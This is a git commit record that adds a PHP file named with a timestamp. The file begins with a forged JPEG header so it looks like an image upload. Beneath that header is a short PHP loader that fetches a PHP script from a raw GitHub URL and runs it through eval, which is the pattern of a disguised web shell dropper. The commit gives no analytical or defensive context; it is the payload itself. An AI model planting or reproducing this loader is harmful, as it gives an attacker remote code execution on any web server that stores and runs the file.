972c94dd81019d18005767bbd71469f651c9510f
thisforbidden404-cloud <thisforbidden404@gmail.com>
2026-04-16 06:23:22 +0700

    Add files via upload

---
+++ 1770709166_12.php
@@ -0,0 +1,10 @@
+JFIF``fExifMM*i>2P?CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality
+
+
+<?Php
+
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'raw.githubusercontent.com/SyaidaAlya/AlfaSyaida/main/syaidaAliturkesh.php'));
+        exit;
+   
+?>
